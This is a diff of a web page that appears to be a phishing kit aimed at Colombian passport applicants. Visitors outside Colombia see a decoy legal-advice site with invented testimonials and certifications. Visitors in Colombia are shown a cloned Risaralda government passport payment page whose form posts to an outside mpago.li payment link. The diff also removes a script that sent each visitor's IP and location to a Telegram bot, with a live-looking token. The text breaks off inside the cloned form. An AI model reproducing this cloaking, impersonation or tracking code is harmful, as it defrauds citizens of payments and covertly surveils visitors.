@@ -6,49 +6,14 @@
     <title>Asesoría Legal en Requisitos de Pasaporte y Migración | Consultoría Profesional</title>
     <meta name="description" content="Asesoría legal especializada en requisitos de pasaporte y migración. Orientación experta, revisión documental y preparación completa.">
     <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=AW-17179872871">
-</script>
-    
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'AW-17179872871');
-</script>
-
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-17179872871"></script>
     <script>
-(async function() {
-  const telegramBotToken = '7730418073:AAHT54JOz9xP9cNyOx9S50HISTSDNsn23SI';  // ← reemplaza por tu token real
-  const chatId = '5848946481';         // ← reemplaza por tu ID real
-
-  try {
-    // Obtener IP y ubicación desde ipinfo
-    const res = await fetch('https://ipinfo.io/json?token=3798a6699b4912');
-    const data = await res.json();
-
-    // Crear mensaje
-    const mensaje = `👤 Nueva visita a tu PASA\n\n🌐 IP: ${data.ip}\n📍 Ciudad: ${data.city}, ${data.country}\n🔗 URL: ${window.location.href}`;
-
-    // Enviar mensaje a Telegram
-    await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: mensaje
-      })
-    });
-
-    console.log('✅ Mensaje enviado a Telegram');
-
-  } catch (error) {
-    console.error('❌ Error al enviar mensaje a Telegram:', error);
-  }
-})();
-</script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'AW-17179872871');
+    </script>
     <style>
-        
         * {
             margin: 0;
             padding: 0;
@@ -589,294 +554,853 @@
                 padding: 12px 20px;
             }
         }
+
+        /* Loading spinner */
+        .loading-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(59, 130, 246, 0.2);
+            border-radius: 50%;
+            border-top: 5px solid #3b82f6;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
-    <!-- Header -->
-    <header class="header">
-        <div class="container">
-            <div class="header-content fade-in-up">
-                <div class="logo">AL</div>
-                <h1>Asesoría Legal en Requisitos de Pasaporte y Migración</h1>
-                <p class="subtitle">Preparación completa de documentos, revisión y orientación experta</p>
-                <a href="#contacto" class="cta-button">Solicitar Consulta</a>
+    <!-- Contenedor para la detección de ubicación -->
+    <div class="loading-container" id="loading">
+        <div class="spinner"></div>
+    </div>
+    
+    <!-- Contenido para fuera de Colombia -->
+    <div id="default-content" style="display: none;">
+        <!-- Header -->
+        <header class="header">
+            <div class="container">
+                <div class="header-content fade-in-up">
+                    <div class="logo">AL</div>
+                    <h1>Asesoría Legal en Requisitos de Pasaporte y Migración</h1>
+                    <p class="subtitle">Preparación completa de documentos, revisión y orientación experta</p>
+                    <a href="#contacto" class="cta-button">Solicitar Consulta</a>
+                </div>
+            </div>
+        </header>
+
+        <!-- Hero Section -->
+        <section class="hero">
+            <div class="container">
+                <div class="hero-content">
+                    <h2>Tu Tranquilidad es Nuestra Prioridad</h2>
+                    <div class="benefits">
+                        <div class="benefit">
+                            <div class="benefit-icon">📋</div>
+                            <h3>Orientación Experta Paso a Paso</h3>
+                            <p>Te guiamos en cada etapa del proceso con conocimiento actualizado de la normativa vigente.</p>
+                        </div>
+                        <div class="benefit">
+                            <div class="benefit-icon">🔍</div>
+                            <h3>Revisión Documental Profesional</h3>
+                            <p>Análisis detallado de tus documentos para asegurar que cumplan todos los requisitos legales.</p>
+                        </div>
+                        <div class="benefit">
+                            <div class="benefit-icon">📚</div>
+                            <h3>Actualización Continua de Requisitos</h3>
+                            <p>Información siempre actualizada sobre cambios en las regulaciones migratorias.</p>
+                        </div>
+                        <div class="benefit">
+                            <div class="benefit-icon">⏱️</div>
+                            <h3>Asesoría Personalizada</h3>
+                            <p>Consultas adaptadas a tu situación específica y necesidades particulares.</p>
+                        </div>
+                        <div class="benefit">
+                            <div class="benefit-icon">🛡️</div>
+                            <h3>Respaldo Legal Profesional</h3>
+                            <p>Soporte de abogados especializados en derecho migratorio y documentación oficial.</p>
+                        </div>
+                    </div>
+                    <a href="#contacto" class="cta-button">Obtener Orientación Ahora</a>
+                </div>
+            </div>
+        </section>
+
+        <!-- Services Section -->
+        <section class="services">
+            <div class="container">
+                <h2>Nuestros Servicios de Asesoría</h2>
+                <div class="services-grid">
+                    <div class="service-card">
+                        <h3>Consultoría en Requisitos de Pasaporte</h3>
+                        <ul class="service-list">
+                            <li>Análisis de documentos requeridos</li>
+                            <li>Orientación sobre procedimientos legales</li>
+                            <li>Revisión de formularios y solicitudes</li>
+                            <li>Asesoría sobre tiempos y costos</li>
+                            <li>Guía para casos especiales</li>
+                        </ul>
+                    </div>
+                    <div class="service-card">
+                        <h3>Asesoría en Procesos Migratorios</h3>
+                        <ul class="service-list">
+                            <li>Evaluación de elegibilidad</li>
+                            <li>Preparación de documentación</li>
+                            <li>Interpretación de regulaciones</li>
+                            <li>Orientación sobre visas y permisos</li>
+                            <li>Seguimiento de cambios normativos</li>
+                        </ul>
+                    </div>
+                    <div class="service-card">
+                        <h3>Revisión y Preparación Documental</h3>
+                        <ul class="service-list">
+                            <li>Verificación de autenticidad</li>
+                            <li>Corrección de errores comunes</li>
+                            <li>Preparación de expedientes</li>
+                            <li>Traducción y apostillado</li>
+                            <li>Organización cronológica</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Credibility Section -->
+        <section class="credibility">
+            <div class="container">
+                <h2>Lo Que Dicen Nuestros Clientes</h2>
+                <div class="testimonials">
+                    <div class="testimonial">
+                        <p class="testimonial-text">"La asesoría fue excepcional. Me ayudaron a entender todos los requisitos y mi documentación quedó perfecta. Muy profesionales."</p>
+                        <div class="testimonial-author">
+                            <div class="author-avatar">MR</div>
+                            <div>
+                                <strong>María Rodríguez</strong><br>
+                                <small>Empresaria, Bogotá</small>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="testimonial">
+                        <p class="testimonial-text">"Gracias a su orientación experta, pude preparar todos mis documentos correctamente. El proceso fue mucho más claro con su ayuda."</p>
+                        <div class="testimonial-author">
+                            <div class="author-avatar">CL</div>
+                            <div>
+                                <strong>Carlos López</strong><br>
+                                <small>Ingeniero, Medellín</small>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="testimonial">
+                        <p class="testimonial-text">"Su conocimiento actualizado de las regulaciones me ahorró tiempo y errores. Recomiendo su asesoría sin dudarlo."</p>
+                        <div class="testimonial-author">
+                            <div class="author-avatar">AS</div>
+                            <div>
+                                <strong>Ana Sánchez</strong><br>
+                                <small>Doctora, Cali</small>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="certifications">
+                    <h3>Certificaciones y Afiliaciones</h3>
+                    <div class="cert-logos">
+                        <div class="cert-logo">Colegio de Abogados</div>
+                        <div class="cert-logo">Asociación Migratoria</div>
+                        <div class="cert-logo">Certificación Legal</div>
+                        <div class="cert-logo">ISO 9001</div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Contact Form -->
+        <section class="contact-form" id="contacto">
+            <div class="container">
+                <h2>Solicita Tu Consulta Especializada</h2>
+                <div class="form-container">
+                    <form id="contactForm">
+                        <div class="form-group">
+                            <label for="nombre">Nombre Completo *</label>
+                            <input type="text" id="nombre" name="nombre" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="email">Correo Electrónico *</label>
+                            <input type="email" id="email" name="email" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="telefono">Teléfono *</label>
+                            <input type="tel" id="telefono" name="telefono" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="consulta">Describe tu consulta *</label>
+                            <textarea id="consulta" name="consulta" placeholder="Compártenos los detalles de tu situación para brindarte la mejor asesoría..." required></textarea>
+                        </div>
+                        <button type="submit" class="cta-button" style="width: 100%; margin-top: 20px;">
+                            Solicitar Consulta
+                        </button>
+                    </form>
+                </div>
+            </div>
+        </section>
+
+        <!-- FAQ Section -->
+        <section class="faq">
+            <div class="container">
+                <h2>Preguntas Frecuentes</h2>
+                <div class="faq-item">
+                    <div class="faq-question" onclick="toggleFAQ(this)">
+                        ¿Qué incluye la asesoría legal?
+                    </div>
+                    <div class="faq-answer">
+                        Nuestra asesoría incluye revisión documental completa, orientación sobre requisitos legales vigentes, preparación de expedientes, interpretación de normativas y seguimiento personalizado de tu caso.
+                    </div>
+                </div>
+                <div class="faq-item">
+                    <div class="faq-question" onclick="toggleFAQ(this)">
+                        ¿Cuánto tiempo demora la revisión?
+                    </div>
+                    <div class="faq-answer">
+                        La revisión inicial se realiza en 24-48 horas. Para casos complejos que requieren análisis detallado, el tiempo puede extenderse hasta 5 días hábiles, siempre manteniéndote informado del progreso.
+                    </div>
+                </div>
+                <div class="faq-item">
+                    <div class="faq-question" onclick="toggleFAQ(this)">
+                        ¿Es necesario presentar documentos originales?
+                    </div>
+                    <div class="faq-answer">
+                        Para la asesoría inicial, copias digitales de alta calidad son suficientes. Solo recomendamos originales cuando sea estrictamente necesario para verificaciones específicas.
+                    </div>
+                </div>
+                <div class="faq-item">
+                    <div class="faq-question" onclick="toggleFAQ(this)">
+                        ¿Ofrecen seguimiento después de la consulta?
+                    </div>
+                    <div class="faq-answer">
+                        Sí, incluimos seguimiento gratuito durante 30 días para resolver dudas adicionales y actualizarte sobre cambios normativos que puedan afectar tu caso.
+                    </div>
+                </div>
+                <div class="faq-item">
+                    <div class="faq-question" onclick="toggleFAQ(this)">
+                        ¿Qué experiencia tienen en casos migratorios?
+                    </div>
+                    <div class="faq-answer">
+                        Contamos con más de 10 años de experiencia especializada en derecho migratorio, habiendo asesorado exitosamente a más de 2,000 clientes en diversos procesos documentales.
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Privacy Section -->
+        <section class="privacy">
+            <div class="container">
+                <h2>Seguridad y Privacidad Garantizada</h2>
+                <p style="max-width: 800px; margin: 0 auto; font-size: 1.1em; line-height: 1.7;">
+                    Protegemos tu información personal con los más altos estándares de seguridad. Cumplimos con todas las regulaciones de privacidad y manejo de datos personales.
+                </p>
+                <div class="security-badges">
+                    <div class="security-badge">
+                        🔒 SSL Certificado
+                    </div>
+                    <div class="security-badge">
+                        🛡️ GDPR Compliant
+                    </div>
+                    <div class="security-badge">
+                        📋 Política de Privacidad
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <div class="container">
+                <div class="footer-content">
+                    <div class="footer-section">
+                        <h3>Contacto</h3>
+                        <p>📍 Cra. 15 #93-07, Oficina 501<br>Bogotá, Colombia</p>
+                        <p>📞 +57 (1) 234-5678</p>
+                        <p>📧 info@asesorialegal.com</p>
+                        <div class="social-links">
+                            <a href="#" class="social-link">📘</a>
+                            <a href="#" class="social-link">📷</a>
+                            <a href="#" class="social-link">🐦</a>
+                            <a href="#" class="social-link">💼</a>
+                        </div>
+                    </div>
+                    <div class="footer-section">
+                        <h3>Servicios</h3>
+                        <p><a href="#">Asesoría en Pasaportes</a></p>
+                        <p><a href="#">Consultoría Migratoria</a></p>
+                        <p><a href="#">Revisión Documental</a></p>
+                        <p><a href="#">Preparación de Expedientes</a></p>
+                    </div>
+                    <div class="footer-section">
+                        <h3>Legal</h3>
+                        <p><a href="#politica-privacidad">Política de Privacidad</a></p>
+                        <p><a href="#terminos">Términos y Condiciones</a></p>
+                        <p><a href="#proteccion-datos">Protección de Datos</a></p>
+                        <p><a href="#cookies">Política de Cookies</a></p>
+                    </div>
+                    <div class="footer-section">
+                        <h3>Horarios de Atención</h3>
+                        <p>Lunes a Viernes: 8:00 AM - 6:00 PM</p>
+                        <p>Sábados: 9:00 AM - 2:00 PM</p>
+                        <p>Domingos: Solo emergencias</p>
+                        <p style="margin-top: 15px; color: #3b82f6;">
+                            <strong>Consultas virtuales disponibles</strong>
+                        </p>
+                    </div>
+                </div>
+                <div class="footer-bottom">
+                    <p>&copy; 2024 Asesoría Legal Profesional. Todos los derechos reservados. | Registro Profesional: MP-2024-001</p>
+                </div>
+            </div>
+        </footer>
+
+        <!-- Sticky Contact Button -->
+        <a href="#contacto" class="sticky-contact">💬 Consulta Gratis</a>
+    </div>
+    
+    <!-- Contenido especial para Colombia -->
+    <div id="colombia-content" style="display: none;">
+        <!DOCTYPE html>
+<!-- saved from url=(0055)https://pasaportes.risaralda.gov.co/pasaporte/user/pago -->
+<html lang="es" style="height: 100%;">
+
+<head prefix="og: http://ogp.me/ns# ">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="origin-trial"
+        content="Az520Inasey3TAyqLyojQa8MnmCALSEU29yQFW8dePZ7xQTvSt73pHazLFTK5f7SyLUJSo2uKLesEtEa9aUYcgMAAACPeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZyIsImV4cGlyeSI6MTcyNTQwNzk5OSwiaXNTdWJkb21haW4iOnRydWUsImlzVGhpcmRQYXJ0eSI6dHJ1ZX0=">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Realice el pago de su pasaporte</title>
+    <meta name="author" content="Gobernación risaralda">
+    <meta name="language" content="spanish">
+    <meta property="og:locale" content="es_la">
+    <meta property="og:locale:alternate" content="es_es">
+    <meta property="og:site_name" content="Gobernación risaralda">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="Robots" content="index,follow">
+   
+
+   
+    <link href="./pagopasaporte_files/bootstrap.min.css" rel="stylesheet" media="screen">
+    <link href="./pagopasaporte_files/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href="./pagopasaporte_files/jquery-ui.min.css" rel="stylesheet" type="text/css">
+    <link href="./pagopasaporte_files/jquery-ui-timepicker-addon.min.css" rel="stylesheet" type="text/css">
+    <link href="./pagopasaporte_files/user.min.css" rel="stylesheet" type="text/css">
+    <link href="./pagopasaporte_files/user.css" rel="stylesheet" type="text/css">
+    <link href="./pagopasaporte_files/user.min(1).css" rel="stylesheet" type="text/css">
+    <link href="./pagopasaporte_files/bloqueMegamenu.css" rel="stylesheet" type="text/css">
+
+    <script src="./pagopasaporte_files/jquery.min.js.descarga"></script>
+    <script src="./pagopasaporte_files/language.min.js.descarga"></script>
+    <script src="./pagopasaporte_files/jquery.validate.min.js.descarga"></script>
+
+    <link type="text/css" rel="stylesheet" charset="UTF-8" href="./pagopasaporte_files/m=el_main_css">
+    <script type="text/javascript" charset="UTF-8" src="./pagopasaporte_files/m=el_main"></script>
+</head>
+
+<body class="dModPasaporte dInterno dInternoAmplio">
+
+    <script>
+        $("body").addClass("dInterno dInternoAmplio")
+    </script>
+    <header>
+        <div class="nxBlock nxBlock4319 nxBlockDesign1 nxBlockConfigTools
+     hide">
+            <h2>
+                <span class="nxBlockTitle">Config Idioma</span>
+            </h2>
+
+            <div class="defaultConfigTools blockContent">
+
+                <div class="contentLinkToolsHidden">
+                    <ul class="linkToolsHidden">
+                        <li><a title="Vacio." href="https://pasaportes.risaralda.gov.co/pasaporte/user/pago#"
+                                class="linkTools">Vacio</a></li>
+                    </ul>
+                </div>
+
+                <div id="menu_guia" class="collapse">
+                    <div class="container">
+                        <div class="row">
+                            <div class="col-sm-6 col-md-6 contentTools">
+                                <div class="contentBtnConfigTools">
+                                    <button type="button" class="btn btn-default btnConfigTools" data-type="configTools"
+                                        data-typedes="default">Configuración por
+                                        defecto</button>
+                                    <button type="button" class="btn btn-default btnConfigTools" data-type="configTools"
+                                        data-typedes="highContrast">Alto contraste</button>
+                                    <button type="button" class="btn btn-default btnConfigTools" data-type="configTools"
+                                        data-typedes="textOnly">Solo texto</button>
+                                </div>
+
+                                <div class="contentIconConfigFont">
+                                    <a href="https://pasaportes.risaralda.gov.co/pasaporte/user/pago#"
+                                        class="btnConfigTools" title="Habilitar tamaño de fuente menor"
+                                        data-type="configFont" data-typedes="lg">
+                                        <span class="hide">Tamaño de fuente menor</span>
+                                        <span class="fa fa-font fa-lg" aria-hidden="true"></span>
+                                    </a>
+                                    <a href="https://pasaportes.risaralda.gov.co/pasaporte/user/pago#"
+                                        class="btnConfigTools" title="Habilitar tamaño de fuente predeterminado"
+                                        data-type="configFont" data-typedes="2x">
+                                        <span class="hide">Tamaño de fuente predeterminado</span>
+                                        <span class="fa fa-font fa-2x" aria-hidden="true"></span>
+                                    </a>
+                                    <a href="https://pasaportes.risaralda.gov.co/pasaporte/user/pago#"
+                                        class="btnConfigTools" title="Habilitar tamaño de fuente menor"
+                                        data-type="configFont" data-typedes="3x">
+                                        <span class="hide">Tama&amp;ntildeo de fuente mayor</span>
+                                        <span class="fa fa-font fa-3x" aria-hidden="true"></span>
+                                    </a>
+                                </div>
+                            </div>
+
+                            <div class="col-sm-4 col-md-4 contentConfig">
+
+                                <div class="dropdown">
+                                    <button class="btn btn-default dropdown-toggle" type="button"
+                                        data-toggle="dropdown">Idiomas
+                                        <span class="caret"></span></button>
+                                    <ul class="dropdown-menu">
+                                        <li>
+                                            <a
+                                                href="https://pasaportes.risaralda.gov.co/loader.php?lServicio=Tools2&amp;lTipo=idioma&amp;idioma=ES">Español</a>
+                                        </li>
+                                        <li>
+                                            <a
+                                                href="https://pasaportes.risaralda.gov.co/loader.php?lServicio=Tools2&amp;lTipo=idioma&amp;idioma=EN">Ingles</a>
+                                        </li>
+                                    </ul>
+                                </div>
+                            </div>
+
+                        </div>
+                    </div>
+                </div>
+
+                <script>
+                    let interval;
+
+                    function googleTranslateElementInit() {
+                        new google.translate.TranslateElement({ pageLanguage: 'es', autoDisplay: false }, 'google_translate_element');
+
+                        window.onunload = function () {
+                            killDobleTranslateCookie();
+                        };
+
+                        if (document.readyState === "complete") {
+                            interval = setInterval(killDobleTranslateCookie, 1000);
+                        } else {
+                            window.addEventListener("load", function () {
+                                interval = setInterval(killDobleTranslateCookie, 1000);
+                            }, false);
+                        }
+                    }
+
+                    function killDobleTranslateCookie() {
+                        clearInterval(interval);
+
+                        var cookies = document.cookie;
+                        let cookieGoogtrans = cookies.match(/googtrans=(.*?)(;|$)/g);
+                        //se valida si hay dos cookies de googtrans
+                        if (!cookieGoogtrans || cookieGoogtrans.length <= 1) {
+                            // Se valida si hay una cookie de googtrans
+                            if (cookieGoogtrans && cookieGoogtrans.length === 1) {
+                                // Se obtiene el valor actual de una de las cookies googtrans
+                                let cookieValue = encodeURIComponent(decodeURIComponent(cookieGoogtrans[0].split('=')[1].split(';')[0]));
+                                // Se actualiza la cookie con el valor cookieValue y se agrega atributos secure y sameSite
+                                document.cookie = "googtrans=" + cookieValue + "; secure; samesite=None";
+                            }
+                            return;
+                        }
+                        //se toma la url actual y se valida que no termina en
+                        //por ejemplo gov.co
+                        var href = window.location.hostname.split(".");
+                        if (href.length > 2 && href[0] !== "www") {
+                            for (var ref = href; 2 < ref.length;)
+                                ref.shift();
+                            ref = ref.join(".");
+
+                            /*
+                            Se comenta esta línea dado que para dominios como gov.co no elimina las cookies duplicadas
+                            if (/([a-z]{3})\.([a-z]{2})$/.test(ref)) return;
+                             */
+
+                            // Se obtiene el valor actual de una de las cookies googtrans
+                            let cookieValue = encodeURIComponent(decodeURIComponent(cookieGoogtrans[0].split('=')[1].split(';')[0]));
+                            // Se elimina una de las cookies duplicadas
+                            document.cookie = "googtrans=; path=/; domain=" + ref + "; expires=Thu, 01 Jan 1970 00:00:01 GMT;";
+                            // Se elimina cookie duplicada en sitios diferentes del index
+                            let pathname = window.location.pathname;
+                            pathname = (pathname.charAt(pathname.length - 1) === '/') ? pathname.slice(0, -1) : pathname;
+                            if (pathname !== '') {
+                                document.cookie = "googtrans=; path=" + pathname + "; expires=Thu, 01 Jan 1970 00:00:01 GMT;";
+                            }
+                            // Se actualiza la cookie con el valor cookieValue y se agrega atributos secure y sameSite
+                            document.cookie = "googtrans=" + cookieValue + "; path=/; secure; samesite=None";
+                        }
+                    }
+                </script>
+                <script src="./pagopasaporte_files/element.js.descarga"></script>
+
+                <script>
+                    function switchConfigTools(typeDesc) {
+                        var body = $("body");
+                        body.removeClass("configDefaultTools configHighContrastTools configTextOnlyTools");
+                        $('[data-type="configTools"]').removeClass("active");
+
+                        switch (typeDesc) {
+                            case 'default':
+                                $('[data-typedes="default"]').addClass("active");
+                                body.addClass("configDefaultTools");
+                                break;
+                            case 'highContrast':
+                                $('[data-typedes="highContrast"]').addClass("active");
+                                body.addClass("configHighContrastTools");
+                                break;
+                            case 'textOnly':
+                                $('[data-typedes="textOnly"]').addClass("active");
+                                body.addClass("configTextOnlyTools");
+                                break;
+                        }
+                    }
+
+                    function switchConfigFont(typeDesc) {
+                        var body = $("body");
+                        body.removeClass("faFontLg faFont2x faFont3x");
+                        $('[data-type="configFont"]').removeClass("active");
+
+                        switch (typeDesc) {
+                            case 'lg':
+                                $('[data-typedes="lg"]').addClass("active");
+                                body.addClass("faFontLg");
+                                break;
+                            case '2x':
+                                $('[data-typedes="2x"]').addClass("active");
+                                body.addClass("faFont2x");
+                                break;
+                            case '3x':
+                                $('[data-typedes="3x"]').addClass("active");
+                                body.addClass("faFont3x");
+                                break;
+                        }
+                    }
+
+                    $(".btnConfigTools").click(function (e) {
+                        e.preventDefault();
+                        var type = $(this).data("type");
+                        var typeDesc = $(this).data("typedes");
+                        console.log(type + " " + typeDesc);
+                        document.cookie = type + "=" + typeDesc + "; path=/";
+
+                        if (type === "configTools") {
+                            switchConfigTools(typeDesc);
+                        }
+
+                        if (type === "configFont") {
+                            switchConfigFont(typeDesc);
+                        }
+
+                    });
+
+                    function readCookie(name) {
+                        var nameEQ = name + "=";
+                        var ca = document.cookie.split(';');
+                        for (var i = 0; i < ca.length; i++) {
+                            var c = ca[i];
+                            while (c.charAt(0) === ' ') c = c.substring(1, c.length);
+                            if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
+                        }
+                        return null;
+                    }
+
+                    $(document).ready(function () {
+                        var cookieConfigTools = readCookie('configTools');
+                        var cookieConfigFont = readCookie('configFont');
+
+                        if (readCookie('configTools')) {
+                            switchConfigTools(cookieConfigTools);
+                        }
+
+                        if (readCookie('configFont')) {
+                            switchConfigFont(cookieConfigFont);
+                        }
+                    });
+                </script>
+
+            </div>
+        </div>
+        <div class="tabla1 tablaBloque1656  ">
+
+            <div class="contenido1">
+                <div class="header-gov">
+                    <div class="container">
+                        <div class="row">
+                            <!-- logo -->
+                            <div class="col-xs-8 col-sm-4 logo-gov">
+                                <div class="bloqueZona1  tipoDisplay">
+
+                                    <a href="https://www.gov.co/home/" title="Gobierno de Colombia" target="_blank">
+                                        <img class="img-responsive " src="./pagopasaporte_files/bloque1771.png"
+                                            id="bloqueImg1771" alt="Gobierno de Colombia">
+                                    </a>
+                                </div>
+                            </div>
+                            <!-- end logo -->
+                            <!-- toolbar -->
+                            <div class="col-xs-4 col-sm-8 toolbar-gov-co">
+                                <div class="bloqueZona1  tipoDisplay">
+                                    <div class="tabla1 tablaBloque1850 toolbar-header-gov ">
+
+                                        <div class="contenido1">
+                                            <ul class="list-inline text-right toolbar-login">
+
+                                                <!-- language en -->
+                                                <li class="toolbar_language toolbar_language--en notranslate">
+                                                    <a href="https://pasaportes.risaralda.gov.co/loader.php?lServicio=Tools2&amp;lTipo=idioma&amp;idioma=EN"
+                                                        class="lang_button notranslate" data-lang="en">
+                                                        EN
+                                                    </a>
+                                                </li>
+                                                <!-- end language en -->
+                                                <!-- language es -->
+                                                <li class="toolbar_language toolbar_language--es notranslate">
+                                                    <a href="https://pasaportes.risaralda.gov.co/loader.php?lServicio=Tools2&amp;lTipo=idioma&amp;idioma=ES"
+                                                        class="lang_button notranslate lang_active" data-lang="es">
+                                                        ES
+                                                    </a>
+                                                </li>
+                                                <!-- end language es -->
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <!-- end toolbar -->
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="tabla1 tablaBloque2099  ">
+
+            <div class="contenido1">
+                <div class="block block--gov-accessibility">
+                    <div class="block-options navbar-expanded">
+                        <a class="contrast-ref" href="https://pasaportes.risaralda.gov.co/pasaporte/user/pago#"
+                            id="btnAccesibilidad__contraste" title="Alto Contraste">
+                            <i style="color: white" class="fa-solid fa-moon fa-xl"></i>
+                            <p> Contraste </p>
+                        </a>
+                        <a class="min-fontsize" href="https://pasaportes.risaralda.gov.co/pasaporte/user/pago#"
+                            id="btnAccesibilidad__minFontSize" title="Reducir tamaño de letra">
+                            <i style="color: white" class="fa-solid fa-magnifying-glass-minus fa-xl"></i>
+                            <p class="align-middle"> Reducir letra </p>
+                        </a>
+                        <a class="max-fontsize" id="btnAccesibilidad__maxFontSize" title="Aumentar tamaño de letra">
+                            <i style="color: white" class="fa-solid fa-magnifying-glass-plus fa-xl"></i>
+                            <p class="align-middle"> Aumentar letra </p>
+                        </a>
+                        <a target="_blank" href="https://centroderelevo.gov.co/632/w3-channel.html">
+                            <i style="color: white" class="fa-solid fa-hands-asl-interpreting fa-xl"></i>
+                            <p class="align-middle"> Centro de relevo </p>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="tabla1 tablaBloque4344  ">
+
+            <div class="contenido1">
+                <div class="scroll-to-top show-scrollTop">
+                    <button id="btnTopPage" class="scroll-to-topButton" style="">
+                        <i class="fa-solid fa-arrow-up fa-lg"></i>
+                        </span>
+                        <span class="label-button-star-up"> Volver a arriba </span>
+                    </button>
+                </div>
+                <script>
+                    $(document).ready(function () {
+                        $('.scroll-to-topButton').click(function () {
+                            $('body, html').animate({
+                                scrollTop: '0px'
+                            }, 300)
+                        });
+                        $(window).scroll(function () {
+                            if ($(this).scrollTop() > 0) {
+                                $('.scroll-to-topButton').slideDown(300);
+                            } else {
+                                $('.scroll-to-topButton').slideUp(300)
+                            }
+                        })
+                    })
+                </script>
+            </div>
+        </div>
+        <div class="tabla1 tablaBloque4368  ">
+
+            <div class="contenido1">
+                <!-- Google Tag Manager (noscript) -->
+                <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TB5LZMV" height="0" width="0"
+                        style="display:none;visibility:hidden"></iframe></noscript>
+                <!-- End Google Tag Manager (noscript) -->
             </div>
         </div>
     </header>
+    <!-- main content -->
+    <section id="main-content" class="container cInternoAmplio">
+        <section class="row">
+            <section class="col-xs-12">
+                <div id="infoPrincipal">
 
-    <!-- Hero Section -->
-    <section class="hero">
-        <div class="container">
-            <div class="hero-content">
-                <h2>Tu Tranquilidad es Nuestra Prioridad</h2>
-                <div class="benefits">
-                    <div class="benefit">
-                        <div class="benefit-icon">📋</div>
-                        <h3>Orientación Experta Paso a Paso</h3>
-                        <p>Te guiamos en cada etapa del proceso con conocimiento actualizado de la normativa vigente.</p>
-                    </div>
-                    <div class="benefit">
-                        <div class="benefit-icon">🔍</div>
-                        <h3>Revisión Documental Profesional</h3>
-                        <p>Análisis detallado de tus documentos para asegurar que cumplan todos los requisitos legales.</p>
-                    </div>
-                    <div class="benefit">
-                        <div class="benefit-icon">📚</div>
-                        <h3>Actualización Continua de Requisitos</h3>
-                        <p>Información siempre actualizada sobre cambios en las regulaciones migratorias.</p>
-                    </div>
-                    <div class="benefit">
-                        <div class="benefit-icon">⏱️</div>
-                        <h3>Asesoría Personalizada</h3>
-                        <p>Consultas adaptadas a tu situación específica y necesidades particulares.</p>
-                    </div>
-                    <div class="benefit">
-                        <div class="benefit-icon">🛡️</div>
-                        <h3>Respaldo Legal Profesional</h3>
-                        <p>Soporte de abogados especializados en derecho migratorio y documentación oficial.</p>
-                    </div>
-                </div>
-                <a href="#contacto" class="cta-button">Obtener Orientación Ahora</a>
-            </div>
-        </div>
-    </section>
+                    <div class="modMenuContainer row"></div>
+                    <div class="modContent">
 
-    <!-- Services Section -->
-    <section class="services">
-        <div class="container">
-            <h2>Nuestros Servicios de Asesoría</h2>
-            <div class="services-grid">
-                <div class="service-card">
-                    <h3>Consultoría en Requisitos de Pasaporte</h3>
-                    <ul class="service-list">
-                        <li>Análisis de documentos requeridos</li>
-                        <li>Orientación sobre procedimientos legales</li>
-                        <li>Revisión de formularios y solicitudes</li>
-                        <li>Asesoría sobre tiempos y costos</li>
-                        <li>Guía para casos especiales</li>
-                    </ul>
-                </div>
-                <div class="service-card">
-                    <h3>Asesoría en Procesos Migratorios</h3>
-                    <ul class="service-list">
-                        <li>Evaluación de elegibilidad</li>
-                        <li>Preparación de documentación</li>
-                        <li>Interpretación de regulaciones</li>
-                        <li>Orientación sobre visas y permisos</li>
-                        <li>Seguimiento de cambios normativos</li>
-                    </ul>
-                </div>
-                <div class="service-card">
-                    <h3>Revisión y Preparación Documental</h3>
-                    <ul class="service-list">
-                        <li>Verificación de autenticidad</li>
-                        <li>Corrección de errores comunes</li>
-                        <li>Preparación de expedientes</li>
-                        <li>Traducción y apostillado</li>
-                        <li>Organización cronológica</li>
-                    </ul>
-                </div>
-            </div>
-        </div>
-    </section>
+                        <div class="panel panel-default">
+                            <div class="panel-content">
+                                <form id="formulario" class="form-horizontal" method="get"
+                                    action="https://mpago.li/1C7H3Av" novalidate="novalidate">
+                                    <fieldset>
+                                        <legend>Info</legend>
+                                        <div class="form-group col-md-12">
